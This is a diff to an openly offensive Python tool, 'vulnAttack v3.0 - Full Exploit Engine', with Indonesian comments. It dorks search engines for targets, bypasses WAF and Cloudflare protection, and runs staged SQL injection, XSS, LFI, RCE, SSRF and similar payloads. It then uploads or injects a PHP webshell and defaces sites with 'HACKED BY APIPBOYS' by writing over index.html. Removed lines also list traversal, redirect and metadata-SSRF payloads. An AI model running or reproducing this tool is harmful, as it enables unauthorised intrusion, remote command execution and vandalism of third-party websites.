@@ -52,14 +52,13 @@ except ImportError:
     CLOUDSCRAPER_AVAILABLE = False
 
 # ================================================================
-# INTEGRASI MODUL BYPASS (DENGAN FALLBACK LENGKAP)
+# INTEGRASI MODUL BYPASS (dengan fallback)
 # ================================================================
 try:
     from bypass import CloudflareBypass, WAFBypass, CaptchaSolver, HeaderManager, Utils
     BYPASS_MODULE_AVAILABLE = True
 except ImportError:
     BYPASS_MODULE_AVAILABLE = False
-    # Fallback dummy classes
     class HeaderManager:
         def __init__(self, *args, **kwargs): pass
         def get_headers(self, *args, **kwargs): return {}
@@ -179,130 +178,46 @@ def load_bypass_settings():
     return {"bypass": {"waf": {"max_retries": 3, "retry_delay": 5}, "delay": {"min": 1, "max": 3, "randomize": True}}}
 
 # ================================================================
-# DESKRIPSI SERANGAN
+# DETEKSI OTOMATIS WAF/CLOUDFLARE
 # ================================================================
-ATTACK_DESCRIPTIONS = {
-    'sqli': """
-[+] SQL Injection (SQLi)
-[+] Technique: Error-based, Union-based, Time-based Blind, Boolean-based Blind
-[+] Payload examples:
-    - ' OR 1=1--
-    - ' UNION SELECT NULL--
-    - ' AND SLEEP(5)--
-[+] Description: Injecting malicious SQL queries through user input to manipulate database.
-""",
-    'xss': """
-[+] Cross-Site Scripting (XSS)
-[+] Technique: Reflected, Stored, DOM-based
-[+] Payload examples:
-    - <script>alert(1)</script>
-    - <img src=x onerror=alert(1)>
-    - javascript:alert(1)
-[+] Description: Injecting client-side scripts into web pages viewed by other users.
-""",
-    'lfi': """
-[+] Local File Inclusion (LFI)
-[+] Technique: Path traversal, Null byte injection, Double encoding
-[+] Payload examples:
-    - ../../../../etc/passwd
-    - ../../../../etc/passwd%00
-    - ../../../../etc/passwd%2500
-[+] Description: Reading local files on the server by manipulating file paths.
-""",
-    'rce': """
-[+] Remote Code Execution (RCE)
-[+] Technique: Command injection, PHP code injection, eval injection
-[+] Payload examples:
-    - ; id
-    - <?php system($_GET['cmd']); ?>
-    - | whoami
-[+] Description: Executing arbitrary commands on the server.
-""",
-    'ssrf': """
-[+] Server-Side Request Forgery (SSRF)
-[+] Technique: Internal IP access, Port scanning, Protocol smuggling
-[+] Payload examples:
-    - http://127.0.0.1
-    - http://169.254.169.254/latest/meta-data/
-    - gopher://localhost:80/_GET /
-[+] Description: Forcing the server to make requests to internal resources.
-""",
-    'xxe': """
-[+] XML External Entity (XXE)
-[+] Technique: File read, SSRF, Denial-of-service
-[+] Payload examples:
-    - <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
-[+] Description: Exploiting XML parsers to read files or access internal networks.
-""",
-    'nosqli': """
-[+] NoSQL Injection
-[+] Technique: Operator injection ($ne, $gt, $or), JavaScript injection
-[+] Payload examples:
-    - username[$ne]=admin
-    - password[$gt]=a
-[+] Description: Bypassing NoSQL database queries using special operators.
-""",
-    'ssti': """
-[+] Server-Side Template Injection (SSTI)
-[+] Technique: Template engine abuse (Jinja2, Twig, Freemarker)
-[+] Payload examples:
-    - {{ 7*7 }}
-    - {{ config }}
-    - <%= system('id') %>
-[+] Description: Injecting malicious template code to execute system commands.
-""",
-    'cmd_injection': """
-[+] Command Injection
-[+] Technique: Shell meta-characters, command chaining, output redirection
-[+] Payload examples:
-    - ; id
-    - | whoami
-    - && ls
-[+] Description: Injecting operating system commands through unsanitized input.
-""",
-    'ldap': """
-[+] LDAP Injection
-[+] Technique: Filter injection, Wildcard abuse
-[+] Payload examples:
-    - (uid=*)
-    - (&(uid=admin)(userPassword=*))
-[+] Description: Manipulating LDAP queries to bypass authentication or extract data.
-""",
-    'open_redirect': """
-[+] Open Redirect
-[+] Technique: URL redirection without validation
-[+] Payload examples:
-    - //evil.com
-    - https://malicious.com
-[+] Description: Redirecting users to external malicious sites.
-""",
-    'csrf': """
-[+] Cross-Site Request Forgery (CSRF)
-[+] Technique: Missing anti-CSRF tokens, weak token validation
-[+] Payload examples:
-    - No CSRF token in forms
-    - Missing CSRF header
-[+] Description: Forcing authenticated users to perform unintended actions.
-""",
-    'file_upload': """
-[+] File Upload
-[+] Technique: Extension bypass, MIME type spoofing, Double extension
-[+] Payload examples:
-    - shell.php
-    - shell.php.jpg
-    - shell.gif.php
-[+] Description: Uploading malicious files to gain remote access.
-""",
-    'directories': """
-[+] Directory Traversal / Listing
-[+] Technique: Path traversal, Directory brute-forcing
-[+] Payload examples:
-    - admin
-    - backup/
-    - tmp/
-[+] Description: Accessing directories that should be restricted.
-"""
+def detect_waf(target):
+    try:
+        r = requests.get(target, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
+        headers = r.headers
+        body = r.text.lower()
+        if 'cf-ray' in headers or 'cloudflare' in body:
+            return 'cloudflare'
+        server = headers.get('Server', '').lower()
+        if 'cloudflare' in server:
+            return 'cloudflare'
+        waf_patterns = ['mod_security', 'blocked', 'access denied', 'waf', 'imperva', 'akamai', 'fastly', 'aws waf', 'f5', 'big-ip']
+        if any(p in body for p in waf_patterns):
+            return 'waf'
+        return None
+    except:
+        return None
+
+# ================================================================
+# DESKRIPSI SERANGAN & MAPPING
+# ================================================================
+ATTACK_CATEGORIES = {
+    '1': ('sqli', 'SQL Injection'),
+    '2': ('xss', 'XSS (Cross-Site Scripting)'),
+    '3': ('lfi', 'LFI (Local File Inclusion)'),
+    '4': ('rce', 'RCE (Remote Code Execution)'),
+    '5': ('ssrf', 'SSRF (Server-Side Request Forgery)'),
+    '6': ('xxe', 'XXE (XML External Entity)'),
+    '7': ('nosqli', 'NoSQL Injection'),
+    '8': ('ssti', 'SSTI (Server-Side Template Injection)'),
+    '9': ('cmd_injection', 'Command Injection'),
+    '10': ('ldap', 'LDAP Injection'),
+    '11': ('open_redirect', 'Open Redirect'),
+    '12': ('csrf', 'CSRF (Cross-Site Request Forgery)'),
+    '13': ('file_upload', 'File Upload'),
+    '14': ('directories', 'Directory Traversal / Listing')
 }
+
+CATEGORY_TO_NUM = {v[0]: k for k, v in ATTACK_CATEGORIES.items()}
 
 # ================================================================
 # PAYLOAD LOADER
@@ -360,7 +275,7 @@ class PayloadLoader:
         return payloads[:limit] if limit else payloads
 
 # ================================================================
-# TEMPLATE LOADER
+# TEMPLATE LOADER (tidak berubah)
 # ================================================================
 class TemplateLoader:
     def __init__(self):
@@ -586,7 +501,7 @@ class MinorVulnAnalyzer:
         return self.findings
 
 # ================================================================
-# DORK ENGINE
+# DORK ENGINE (DIPERBAIKI PAGINATION)
 # ================================================================
 class DorkEngine:
     def __init__(self, session, header_manager):
@@ -638,6 +553,9 @@ class DorkEngine:
                 break
             urls = self._extract_urls(r.text, source)
             results.extend(urls)
+            if 'next' not in r.text.lower() and '>Next<' not in r.text:
+                print_progress("No more pages.", 'info')
+                break
             sleep_time = random.uniform(3, 7)
             print_progress(f"Sleeping {sleep_time:.1f}s to avoid rate-limit...", 'progress')
             time.sleep(sleep_time)
@@ -746,7 +664,7 @@ class VulnAttack:
         if response and self.waf_bypass.detect(response.text, response.headers):
             self.total_retry_count += 1
             if self.total_retry_count > CONFIG['max_total_retries']:
-                print_progress(f"Too many WAF blocks ({self.total_retry_count}). Skipping this test category.", 'warning')
+                print_progress(f"Too many WAF blocks ({self.total_retry_count}). Skipping this test.", 'warning')
                 return None
             print_progress("WAF/Block detected! Retrying with bypass...", 'warning')
             for attempt in range(self.waf_bypass.max_retries):
@@ -763,6 +681,8 @@ class VulnAttack:
 
     def _test_payload(self, payload, param=None, category='sqli'):
         variants = self.waf_bypass.bypass_payload(payload, category)
+        if not variants:
+            variants = [payload]
         used_param = param
         for variant in variants:
             if param:
@@ -794,54 +714,96 @@ class VulnAttack:
     # ---------- VULNERABILITY TESTS ----------
     def test_sqli(self):
         print_progress("Testing SQL Injection...", 'progress')
-        payloads = self.payloads.get('sqli', limit=500)
-        found = False
-        for p in payloads:
-            r, used_param = self._test_payload(p, category='sqli')
-            if r:
-                errors = ['mysql','sql','syntax','unclosed','query','database','warning','error','line','column','table','from','SQLSTATE','MariaDB','PostgreSQL','SQLite']
-                if any(err in r.text.lower() for err in errors):
-                    self.vulns.append({'type':'SQLi','url':r.url,'payload':p,'evidence':'SQL error'})
-                    self.sqli_vuln = {'url': r.url, 'payload': p, 'param': used_param}
-                    print_progress(f"SQLi found: {r.url} (param: {used_param})", 'success')
-                    found = True
-                    break
-                if r.status_code == 500:
-                    self.vulns.append({'type':'SQLi (possible)','url':r.url,'payload':p,'evidence':'Status 500'})
-                    self.sqli_vuln = {'url': r.url, 'payload': p, 'param': used_param}
-                    print_progress(f"SQLi (possible) found: {r.url} (param: {used_param})", 'success')
-                    found = True
-                    break
-        if not found:
-            print_progress("Testing SQLi (time-based)...", 'progress')
-            time_payloads = ["' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--"]
-            for p in time_payloads:
-                start = time.time()
-                r, used_param = self._test_payload(p, category='sqli')
-                elapsed = time.time() - start
-                if elapsed > 4 and r:
-                    self.vulns.append({'type':'SQLi (Time-based)','url':r.url,'payload':p,'evidence':f'Delay {elapsed:.2f}s'})
-                    self.sqli_vuln = {'url': r.url, 'payload': p, 'param': used_param}
-                    print_progress(f"SQLi (time-based) found: {r.url} (param: {used_param})", 'success')
-                    found = True
-                    break
-        return found
+        self.total_retry_count = 0
+        balancers = ["--+-", ")--+-", "%23", "%00", ";%00", "--", "#", "/*"]
+        
+        def send(payload, param=None):
+            for bal in balancers:
+                if self.total_retry_count > CONFIG['max_total_retries']:
+                    return None, None, None
+                test_payload = payload + bal
+                r, used_param = self._test_payload(test_payload, param=param, category='sqli')
+                if r:
+                    return r, used_param, test_payload
+            return None, None, None
+
+        # Stage 1: Single quote error
+        r, param, payload = send("'")
+        if r and ('error' in r.text.lower() or 'sql' in r.text.lower() or r.status_code == 500):
+            self.vulns.append({'type':'SQLi','url':r.url,'payload':payload,'evidence':'Error from single quote'})
+            self.sqli_vuln = {'url': r.url, 'payload': payload, 'param': param}
+            return True
+
+        # Stage 2: Boolean
+        r1, param, p1 = send("' AND 1=1")
+        if self.total_retry_count > CONFIG['max_total_retries']:
+            return False
+        r2, _, p2 = send("' AND 1=2")
+        if r1 and r2 and len(r1.text) != len(r2.text):
+            self.vulns.append({'type':'SQLi (Boolean)','url':r1.url,'payload':p1,'evidence':'Content difference'})
+            self.sqli_vuln = {'url': r1.url, 'payload': p1, 'param': param}
+            return True
+
+        # Stage 3: ORDER BY
+        for i in range(1, 20):
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                break
+            r, param, payload = send(f"' ORDER BY {i}")
+            if r and ('error' in r.text.lower() or 'sql' in r.text.lower() or r.status_code == 500):
+                cols = i - 1
+                if cols > 0:
+                    self.vulns.append({'type':'SQLi (Order By)','url':r.url,'payload':payload,'evidence':f'Column count: {cols}'})
+                    self.sqli_vuln = {'url': r.url, 'payload': payload, 'param': param}
+                    return True
+                break
+
+        # Stage 4: UNION
+        for i in range(1, 20):
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                break
+            nulls = ','.join(['NULL'] * i)
+            r, param, payload = send(f"' UNION SELECT {nulls}")
+            if r and ('error' not in r.text.lower() and 'sql' not in r.text.lower()):
+                self.vulns.append({'type':'SQLi (Union)','url':r.url,'payload':payload,'evidence':f'Union with {i} columns'})
+                self.sqli_vuln = {'url': r.url, 'payload': payload, 'param': param}
+                return True
+
+        # Stage 5: Time-based
+        for p in ["' AND SLEEP(5)", "' OR SLEEP(5)"]:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                break
+            start = time.time()
+            r, param, payload = send(p)
+            elapsed = time.time() - start
+            if elapsed > 4 and r:
+                self.vulns.append({'type':'SQLi (Time-based)','url':r.url,'payload':payload,'evidence':f'Delay {elapsed:.2f}s'})
+                self.sqli_vuln = {'url': r.url, 'payload': payload, 'param': param}
+                return True
+        return False
 
     def test_xss(self):
-        print_progress("Testing XSS (reflected)...", 'progress')
+        print_progress("Testing XSS...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('xss', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping XSS test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='xss')
             if r and p in r.text:
                 self.vulns.append({'type':'XSS (Reflected)','url':r.url,'payload':p,'evidence':'Reflected'})
-                print_progress(f"XSS (Reflected) found: {r.url}", 'success')
+                print_progress(f"XSS found: {r.url}", 'success')
                 return True
         return False
 
     def test_lfi(self):
         print_progress("Testing LFI...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('lfi', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping LFI test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='lfi')
             if r:
                 indicators = ['root:x:','win.ini','base64','hosts','shadow','apache','nginx','www-data','daemon','nobody']
@@ -853,8 +815,12 @@ class VulnAttack:
 
     def test_rce(self):
         print_progress("Testing RCE...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('rce', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping RCE test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='rce')
             if r:
                 outputs = ['uid=','root','user','bin','whoami','id','gid=','groups=']
@@ -866,8 +832,12 @@ class VulnAttack:
 
     def test_ssrf(self):
         print_progress("Testing SSRF...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('ssrf', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping SSRF test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='ssrf')
             if r:
                 ips = ['127.0.0.1','localhost','169.254.169.254','0.0.0.0','::1']
@@ -879,9 +849,13 @@ class VulnAttack:
 
     def test_xxe(self):
         print_progress("Testing XXE...", 'progress')
+        self.total_retry_count = 0
         content_types = ['application/xml', 'text/xml', 'application/xml+rss']
         for ct in content_types:
             for p in self.payloads.get('xxe', limit=300):
+                if self.total_retry_count > CONFIG['max_total_retries']:
+                    print_progress("Stopping XXE test due to WAF blocks.", 'warning')
+                    break
                 r = self._request(self.target, method='POST', data=p, headers={'Content-Type': ct})
                 if r:
                     indicators = ['root','passwd','hosts','shadow','win.ini','config','database']
@@ -893,8 +867,12 @@ class VulnAttack:
 
     def test_nosqli(self):
         print_progress("Testing NoSQLi...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('nosqli', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping NoSQLi test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='nosqli')
             if r:
                 keywords = ['$ne','$gt','$lt','$in','$or','$and','$regex','$where','mongodb']
@@ -906,8 +884,12 @@ class VulnAttack:
 
     def test_ssti(self):
         print_progress("Testing SSTI...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('ssti', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping SSTI test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='ssti')
             if r:
                 if any(kw in r.text for kw in ['49','config','subclasses','self','request','7*7']):
@@ -918,8 +900,12 @@ class VulnAttack:
 
     def test_cmd_injection(self):
         print_progress("Testing Command Injection...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('cmd_injection', limit=300)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping CMDi test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='cmd_injection')
             if r:
                 outputs = ['uid=','root','user','whoami','id','gid=','groups=']
@@ -931,8 +917,12 @@ class VulnAttack:
 
     def test_ldap(self):
         print_progress("Testing LDAP...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('ldap', limit=100)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping LDAP test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='ldap')
             if r and ('uid' in r.text or 'dn' in r.text or 'cn' in r.text):
                 self.vulns.append({'type':'LDAP','url':r.url,'payload':p,'evidence':'LDAP response'})
@@ -942,8 +932,12 @@ class VulnAttack:
 
     def test_open_redirect(self):
         print_progress("Testing Open Redirect...", 'progress')
+        self.total_retry_count = 0
         payloads = self.payloads.get('open_redirect', limit=100)
         for p in payloads:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping Open Redirect test due to WAF blocks.", 'warning')
+                break
             r, _ = self._test_payload(p, category='open_redirect')
             if r and r.url != self.target and 'http' in r.url:
                 self.vulns.append({'type':'Open Redirect','url':r.url,'payload':p,'evidence':'Redirected'})
@@ -953,6 +947,7 @@ class VulnAttack:
 
     def test_csrf(self):
         print_progress("Testing CSRF...", 'progress')
+        self.total_retry_count = 0
         r = self._request(self.target)
         if r:
             forms = re.findall(r'<form[^>]*>', r.text)
@@ -969,6 +964,7 @@ class VulnAttack:
 
     def test_file_upload(self):
         print_progress("Testing File Upload...", 'progress')
+        self.total_retry_count = 0
         endpoints = ['/upload','/upload.php','/uploads','/fileupload','/uploadfile','/upload_file','/uploader','/upload.php?act=upload','/admin/upload','/api/upload','/v1/upload','/media/upload']
         dirs = self.payloads.get('directories', [])
         for d in dirs:
@@ -977,6 +973,9 @@ class VulnAttack:
                 endpoints.append(f"/{d}/upload")
         endpoints = list(set(endpoints))
         for endpoint in endpoints:
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping File Upload test due to WAF blocks.", 'warning')
+                break
             test_url = urljoin(self.base_url, endpoint)
             for fname in self.payloads.get('file_upload', limit=30):
                 files = {'file': (fname, '<?php system($_GET["cmd"]); ?>')}
@@ -992,7 +991,11 @@ class VulnAttack:
 
     def test_directory_traversal(self):
         print_progress("Testing Directory Traversal...", 'progress')
+        self.total_retry_count = 0
         for d in self.payloads.get('directories', limit=100):
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress("Stopping Directory Traversal test due to WAF blocks.", 'warning')
+                break
             test_url = urljoin(self.base_url, d + '/')
             r = self._request(test_url)
             if r and r.status_code == 200:
@@ -1016,7 +1019,6 @@ class VulnAttack:
             r, _ = self._test_payload(payload, param=param, category='sqli')
             return r
 
-        # Deteksi jumlah kolom
         for i in range(1, 20):
             test_payload = f"' UNION SELECT {','.join(['NULL']*i)}-- -"
             r = send_payload(test_payload)
@@ -1101,6 +1103,7 @@ class VulnAttack:
             return
         self.scanned_urls.add(url)
         print_progress(f"Crawling: {url} (depth {depth})", 'progress')
+        self.total_retry_count = 0
         r = self._request(url)
         if not r:
             return
@@ -1115,11 +1118,11 @@ class VulnAttack:
             elif link.startswith('/'):
                 self.crawl(urljoin(self.base_url, link), depth+1)
 
-    # ---------- DEEP AUDIT ----------
     def deep_audit(self):
         print_section("DEEP AUDIT - ANALISIS MENDALAM")
         print_progress("Memindai semua sudut tersembunyi...", 'progress')
         self.scanned_urls = set()
+        self.total_retry_count = 0
         self.crawl(self.target, depth=5)
         if not self.last_html:
             print_progress("No HTML content found. Aborting deep audit.", 'warning')
@@ -1217,13 +1220,12 @@ class VulnAttack:
 
         return findings
 
-    # ---------- DEPLOY WEBSHELL (MULTI-EXPLOIT) ----------
+    # ---------- DEPLOY WEBSHELL ----------
     def deploy_webshell(self):
         if not self.vulns:
             print_progress("No vuln found.", 'error')
             return
 
-        # Kumpulkan semua celah yang bisa dipakai
         candidate_vulns = [v for v in self.vulns if v['type'] in ['RCE', 'Command Injection', 'LFI', 'SQLi']]
         if not candidate_vulns:
             print_progress("No suitable vulnerabilities for webshell deployment.", 'warning')
@@ -1232,7 +1234,6 @@ class VulnAttack:
         print_section("DEPLOY WEBSHELL - MULTI-EXPLOIT MODE")
         print(f"[+] Found {len(candidate_vulns)} potential vulnerabilities.")
 
-        # Pilih template
         templates = [t for t in self.templates.templates if 'webshell' in t]
         if not templates:
             shell_code = "<?php system($_GET['cmd']); ?>"
@@ -1329,16 +1330,17 @@ class VulnAttack:
             print_progress("❌ Webshell deployment FAILED on all vulnerabilities.", 'error')
 
     def _verify_webshell(self, url):
-        """Verifikasi apakah webshell berhasil diakses dengan retry."""
-        for attempt in range(CONFIG['max_verify_retries']):
-            verify_url = url + "?cmd=echo test"
-            r = self._request(verify_url)
-            if r and 'test' in r.text:
-                return True
-            time.sleep(2)
+        params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
+        for param in params:
+            for attempt in range(CONFIG['max_verify_retries']):
+                verify_url = url + f"?{param}=echo test"
+                r = self._request(verify_url)
+                if r and 'test' in r.text:
+                    return True
+                time.sleep(2)
         return False
 
-    # ---------- DEFACE (MULTI-EXPLOIT) ----------
+    # ---------- DEFACE ----------
     def deface_website(self):
         if not self.vulns:
             print_progress("No vuln found.", 'error')
@@ -1352,7 +1354,6 @@ class VulnAttack:
         print_section("DEFACE WEBSITE - MULTI-EXPLOIT MODE")
         print(f"[+] Found {len(candidate_vulns)} potential vulnerabilities.")
 
-        # Pilih template deface
         deface_templates = [t for t in self.templates.templates if 'deface' in t]
         if not deface_templates:
             deface_content = "<h1>HACKED BY APIPBOYS</h1>"
@@ -1396,7 +1397,6 @@ class VulnAttack:
                 break
 
         if not success:
-            # Fallback dengan cmd
             print_progress("Trying fallback for all vulnerabilities...", 'warning')
             for vuln in candidate_vulns:
                 deploy_url = vuln['url'] + f"&cmd=echo '{safe_encoded}' | base64 -d > index.html"
@@ -1411,7 +1411,6 @@ class VulnAttack:
             print_progress("❌ Deface FAILED on all vulnerabilities.", 'error')
 
     def _verify_deface(self, url, content):
-        """Verifikasi deface dengan retry."""
         for attempt in range(CONFIG['max_verify_retries']):
             r = self._request(url)
             if r and content in r.text:
@@ -1464,7 +1463,6 @@ class VulnAttack:
         print("  [10] Dump Data from SQLi (if found)")
         print("  [11] Auto Exploit All (Webshell + Deface)")
 
-    # ---------- AUTO EXPLOIT ----------
     def auto_exploit(self):
         print_section("AUTO EXPLOIT - TRYING WEBSHELL AND DEFACE")
         self.deploy_webshell()
@@ -1476,13 +1474,23 @@ class VulnAttack:
         print_progress(f"Target: {self.target}", 'info')
 
         if self.attack_category:
-            desc = ATTACK_DESCRIPTIONS.get(self.attack_category)
-            if desc:
-                print_section("ATTACK DESCRIPTION")
-                print(desc)
-            else:
-                print_progress(f"Unknown attack category: {self.attack_category}", 'error')
-                return
+            desc_map = {
+                'sqli': "SQL Injection",
+                'xss': "Cross-Site Scripting",
+                'lfi': "Local File Inclusion",
+                'rce': "Remote Code Execution",
+                'ssrf': "Server-Side Request Forgery",
+                'xxe': "XML External Entity",
+                'nosqli': "NoSQL Injection",
+                'ssti': "Server-Side Template Injection",
+                'cmd_injection': "Command Injection",
+                'ldap': "LDAP Injection",
+                'open_redirect': "Open Redirect",
+                'csrf': "Cross-Site Request Forgery",
+                'file_upload': "File Upload",
+                'directories': "Directory Traversal"
+            }
+            print_section(f"ATTACK: {desc_map.get(self.attack_category, self.attack_category)}")
 
         print_section("CRAWLING & ANALYSIS")
         self.crawl(self.target)
@@ -1620,23 +1628,6 @@ def scan_single(target, pl, tl, use_proxy=False, bypass_waf=False):
         return False
 
 # ================================================================
-# DETEKSI OTOMATIS WAF/CLOUDFLARE
-# ================================================================
-def detect_waf(target):
-    try:
-        r = requests.get(target, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
-        headers = r.headers
-        body = r.text.lower()
-        if 'cf-ray' in headers or 'cloudflare' in body:
-            return 'cloudflare'
-        waf_patterns = ['mod_security', 'blocked', 'access denied', 'waf', 'imperva', 'akamai', 'fastly']
-        if any(p in body for p in waf_patterns):
-            return 'waf'
-        return None
-    except:
-        return None
-
-# ================================================================
 # MAIN
 # ================================================================
 def main():
@@ -1647,46 +1638,27 @@ def main():
     use_proxy = '--proxy' in sys.argv
     deep_scan = '--deep-scan' in sys.argv or '--audit' in sys.argv
     attack_category = None
-    if '--attack' in sys.argv:
-        try:
-            idx = sys.argv.index('--attack')
-            attack_category = sys.argv[idx+1].lower()
-        except IndexError:
-            print_progress("Error: --attack requires a category argument.", 'error')
-            print("Available categories: sqli, xss, lfi, rce, ssrf, xxe, nosqli, ssti, cmd_injection, ldap, open_redirect, csrf, file_upload, directories")
-            sys.exit(1)
-        valid_categories = list(ATTACK_DESCRIPTIONS.keys())
-        if attack_category not in valid_categories:
-            print_progress(f"Invalid attack category: {attack_category}", 'error')
-            print(f"Available categories: {', '.join(valid_categories)}")
-            sys.exit(1)
 
-    if '--delay' in sys.argv:
-        try:
-            idx = sys.argv.index('--delay')
-            CONFIG['delay'] = int(sys.argv[idx+1])
-        except:
-            pass
-
-    if '--output' in sys.argv:
-        try:
-            idx = sys.argv.index('--output')
-            CONFIG['output_dir'] = sys.argv[idx+1]
-        except:
-            pass
-
-    # Deteksi otomatis WAF jika target diberikan
     if len(sys.argv) >= 2 and not sys.argv[1].startswith('--'):
         target = sys.argv[1]
         detected = detect_waf(target)
-        if detected == 'cloudflare':
+        if detected:
             bypass_waf = True
-            print_progress("Cloudflare detected. Enabling bypass automatically.", 'info')
-        elif detected == 'waf':
-            bypass_waf = True
-            print_progress("WAF detected. Enabling bypass automatically.", 'info')
+            print_progress(f"{detected.capitalize()} detected. Bypass enabled automatically.", 'info')
         else:
             print_progress("No WAF/Cloudflare detected.", 'info')
+
+    if '--attack' in sys.argv:
+        try:
+            idx = sys.argv.index('--attack')
+            arg = sys.argv[idx+1].lower()
+            if arg.isdigit() and arg in ATTACK_CATEGORIES:
+                attack_category = ATTACK_CATEGORIES[arg][0]
+            else:
+                attack_category = arg
+        except:
+            print_progress("Error: --attack requires a category or number.", 'error')
+            sys.exit(1)
 
     if '--menu' in sys.argv:
         sys.argv = [sys.argv[0]]
@@ -1703,10 +1675,10 @@ def main():
 \033[96m  python vulnAttack.py --proxy --list targets.txt
 \033[96m  python vulnAttack.py --attack sqli http://target.com
 \033[95m[+] MAIN MENU
-\033[97m  [1] Scan target         (masukkan URL)
-\033[97m  [2] Dorking             (masukkan dork)
-\033[97m  [3] Scan list target    (masukkan file target)
-\033[97m  [4] Help                (tampilkan bantuan)
+\033[97m  [1] Scan Target         (pilih kategori serangan)
+\033[97m  [2] Dorking             (cari target)
+\033[97m  [3] Scan List Target    (file)
+\033[97m  [4] Help                (bantuan)
 \033[97m  [5] Exit                (keluar)
 \033[0m""")
         while True:
@@ -1727,12 +1699,19 @@ def main():
                     print_progress(f"{detected.capitalize()} detected. Bypass enabled automatically.", 'info')
                 else:
                     bypass_waf = False
+                print("\n[+] Attack Categories (choose number):")
+                for key, (cat, desc) in ATTACK_CATEGORIES.items():
+                    print(f"  {key}. {desc}")
+                print("  0. All categories")
+                cat_choice = input("[?] Choose (0-14): ").strip()
+                attack_cat = None
+                if cat_choice != '0' and cat_choice in ATTACK_CATEGORIES:
+                    attack_cat = ATTACK_CATEGORIES[cat_choice][0]
                 use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                 deep_opt = input("[?] Deep Scan? (y/n): ").strip().lower() == 'y'
-                attack_opt = input("[?] Attack category (leave blank for all): ").strip().lower()
                 pl = PayloadLoader()
                 tl = TemplateLoader()
-                scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_waf, attack_opt if attack_opt else None)
+                scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_waf, attack_cat)
                 if deep_opt:
                     scanner.deep_audit()
                 scanner.run()
@@ -1761,7 +1740,17 @@ def main():
                 else:
                     print_progress("File not found!", 'error')
             elif choice == '4':
-                print("Help:\n  python vulnAttack.py <target_url>\n  python vulnAttack.py --dork <dork>\n  python vulnAttack.py --list <file> [--threads N]\n  python vulnAttack.py --bypass-waf\n  python vulnAttack.py --proxy\n  python vulnAttack.py --deep-scan\n  python vulnAttack.py --audit\n  python vulnAttack.py --attack <category> <target_url>\n  python vulnAttack.py --delay N\n  python vulnAttack.py --output <dir>")
+                print("""
+Help:
+  Single target: python vulnAttack.py http://target.com
+  Attack category (by number): python vulnAttack.py --attack 1 http://target.com
+  Attack category (by name): python vulnAttack.py --attack sqli http://target.com
+  Dorking: python vulnAttack.py --dork "inurl:index.php?id="
+  List: python vulnAttack.py --list targets.txt --threads 20
+  Bypass: --bypass-waf (auto-detected if Cloudflare/WAF present)
+  Proxy: --proxy
+  Deep scan: --deep-scan
+""")
             elif choice == '5':
                 print_progress("Goodbye!", 'info')
                 sys.exit(0)
@@ -1808,22 +1797,18 @@ def main():
 vulnAttack v3.0 - Full Exploit Engine
 Options:
   <target_url>                     : Scan single target (all attacks)
-  --attack <category> <target_url> : Scan only one attack category
+  --attack <num|name> <target_url> : Scan only one attack category (number or name)
   --dork <dork>                    : Multi-Dorking
   --list <file>                    : Scan multiple targets from file
   --threads N                      : Number of threads (default 10)
   --bypass-waf                     : Enable WAF/Cloudflare bypass
   --proxy                          : Enable proxy (requires config/proxy.txt)
-  --deep-scan                      : Enable deep analysis (crawl deeper, hidden findings)
+  --deep-scan                      : Enable deep analysis
   --audit                          : Extreme audit (same as deep-scan)
-  --delay N                        : Delay between requests in seconds (default 1)
+  --delay N                        : Delay between requests (default 1)
   --output <dir>                   : Output directory (default: results)
   --menu                           : Force interactive menu
   --help                           : Show this help
-
-Available attack categories:
-  sqli, xss, lfi, rce, ssrf, xxe, nosqli, ssti, cmd_injection,
-  ldap, open_redirect, csrf, file_upload, directories
 """)
         sys.exit(0)
 
